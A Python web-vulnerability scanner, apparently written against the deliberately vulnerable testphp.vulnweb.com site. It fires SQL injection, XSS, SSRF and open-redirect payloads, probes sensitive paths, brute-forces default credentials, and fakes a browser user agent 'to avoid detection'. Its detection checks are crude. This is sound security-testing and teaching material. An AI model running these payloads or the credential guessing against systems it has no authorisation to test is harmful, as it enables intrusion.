import requests
from bs4 import BeautifulSoup
import time

def identify_framework(url):
    print(f"[+] Identifying framework for: {url}")
    try:
        headers = requests.head(url).headers
        if "X-Powered-By" in headers:
            print(f"[!] Framework Detected: {headers['X-Powered-By']}")
        elif "WordPress" in requests.get(url).text:
            print("[!] Framework Detected: WordPress")
        else:
            print("[!] Unknown Framework")
    except Exception as e:
        print(f"[ERROR] Identifying framework: {e}")

def test_sql_injection(url, params):
    print(f"[+] Testing SQL Injection for: {url}")
    payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR 1=1 --', "' UNION SELECT NULL,NULL --"]
    
    for param in params:
        for payload in payloads:
            try:
                response = requests.get(url, params={param: payload}, timeout=10)
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    print(f"[!] SQL Injection vulnerability detected: {param} = {payload}")
            except Exception as e:
                print(f"[ERROR] Testing SQL Injection for {param}: {e}")

def test_xss(url):
    """Test for XSS vulnerabilities by probing various parameters and payloads."""
    print(f"[+] Testing XSS potential for: {url}")
    
    # XSS payloads targeting common input fields
    xss_payloads = [
        "<IMG sRC=X onerror=javaScript:alert`xss`>",  # Simple XSS payload
        "<script>alert('XSS')</script>",  # Script-based payload
        "<img src='x' onerror='alert(1)'>",  # Another variant of image-based XSS
        "<svg/onload=alert(1)>",  # SVG-based XSS payload
    ]
    
    # Test parameters known to be vulnerable
    xss_params = [
        "searchFor", "name", "uuname", "cat", "artist", "p"
    ]
    
    headers = {"User-Agent": "Mozilla/5.0"}  # Mimic a real browser to avoid detection
    vulnerabilities = []

    for param in xss_params:
        for payload in xss_payloads:
            try:
                # Test the payload on each parameter and observe the response
                response = requests.get(f"{url}/listproducts.php", params={param: payload}, headers=headers, timeout=10)
                
                # Check for the XSS effect in the response (like alert being triggered)
                if "alert" in response.text.lower() or "xss" in response.text.lower():
                    vulnerabilities.append(f"[!] Possible XSS detected via {param}: {payload} -> {url}/listproducts.php")
                elif "search.php" in url:  # Specific check for POST request on 'search.php'
                    response = requests.post(f"{url}/search.php", data={param: payload}, headers=headers, timeout=10)
                    if "alert" in response.text.lower() or "xss" in response.text.lower():
                        vulnerabilities.append(f"[!] Possible XSS detected via {param}: {payload} -> {url}/search.php")

            except requests.exceptions.RequestException as e:
                print(f"[ERROR] XSS test failed for {url} with {param}={payload}: {e}")

    if vulnerabilities:
        # List the first 4 vulnerabilities
        for vuln in vulnerabilities[:4]:
            print(vuln)
        
        # Show the count of remaining vulnerabilities
        remaining_count = len(vulnerabilities) - 4
        if remaining_count > 0:
            print(f"and ({remaining_count} more)")
    else:
        print("[+] No XSS vulnerability detected.")


def test_ssrf(url):
    print(f"[+] Testing SSRF for: {url}")
    payload = "http://127.0.0.1:22"
    try:
        response = requests.get(url, params={"url": payload})
        if "127.0.0.1" in response.text:
            print("[!] SSRF vulnerability detected!")
        else:
            print("[+] No SSRF vulnerability found.")
    except Exception as e:
        print(f"[ERROR] Testing SSRF: {e}")


def test_directory_indexing(url):
    """Test for directory indexing vulnerabilities in common sensitive paths."""
    print(f"[+] Testing Directory Indexing for: {url}")
    
    common_sensitive_paths = [
        "index.zip", ".idea/workspace.xml", "admin/", "Mod_Rewrite_Shop/.htaccess", "crossdomain.xml",
        "CVS/Root", "secured/phpinfo.php", "_mmServerScripts/mysql.php"
    ]
    
    headers = {"User-Agent": "Mozilla/5.0"}  # Mimic a browser request
    vulnerabilities = []

    for path in common_sensitive_paths:
        try:
            full_url = f"{url.rstrip('/')}/{path}"
            response = requests.get(full_url, headers=headers, allow_redirects=True, timeout=10)
            
            # Check if directory listing indicators exist
            if response.status_code == 200:
                if "Index of" in response.text or "<title>Index of /" in response.text:
                    vulnerabilities.append(f"[!] Directory Indexing enabled: {full_url}")
                elif any(ext in response.text for ext in [".zip", ".xml", ".php", ".htaccess"]):
                    vulnerabilities.append(f"[!] Sensitive file accessible: {full_url}")
            elif response.status_code == 403:
                vulnerabilities.append(f"[!] Possible restricted directory (403 Forbidden): {full_url}")

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Unable to test {full_url}: {e}")

    if vulnerabilities:
        for vuln in vulnerabilities:
            print(vuln)
    else:
        print("[+] No Directory Indexing vulnerability detected.")


def test_weak_password(url):
    """Test for weak password vulnerabilities using common username and password combinations."""
    print(f"[+]Testing Weak Passwords for: {url}")
    usernames = ["test", "testphp", "123456", "admphp"]
    passwords = ["test", "password", "123456", "admin123"]
    for user in usernames:
        for passwd in passwords:
            try:
                response = requests.post(url, data={"username": user, "password": passwd})
                if "welcome" in response.text.lower() or response.status_code == 200:
                    return f"[!]Weak credentials detected at {url} with Username = {user}, Password = {passwd}"
            except Exception as e:
                print(f"Error testing weak passwords for {user}: {e}")
    return "[+]No Weak Password vulnerability detected."


def find_forms(url):
    """Find all forms on the target URL."""
    print(f"[+]Finding forms on: {url}")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!]Error finding forms on {url}: {e}")
    return []


def test_csrf(forms):
    """Test for CSRF vulnerabilities by checking if forms have CSRF tokens."""
    print("[+]Testing CSRF vulnerabilities.")
    for i, form in enumerate(forms, start=1):
        inputs = form.find_all("input")
        if not any("csrf" in inp.get("name", "").lower() for inp in inputs):
            print(f"[!]Form {i} may be vulnerable to CSRF.")


def test_open_redirect(url):
    """Test for open redirect vulnerabilities."""
    payload = "/?next=http://malicious.com"
    try:
        response = requests.get(url + payload)
        if "malicious.com" in response.url:
            return f"[!]Open Redirect vulnerability detected in: {url}"
    except Exception as e:
        print(f"[!]Error testing Open Redirect for {url}: {e}")
    return "[+]No Open Redirect vulnerability detected."



def run_security_scan(url):
    print(f"\n=== Starting Security Scan for {url} ===")
    identify_framework(url)
    test_sql_injection(url, ["id", "user", "query"])
    test_xss(url)
    test_ssrf(url)
    forms = find_forms(url)
    test_csrf(forms)
    print(test_open_redirect(url))

    test_directory_indexing(url)
    print(test_weak_password(url))
    print("=== Security Scan Completed ===\n")

# Example usage
if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/login.php"  # Replace with your target
    run_security_scan(target_url)
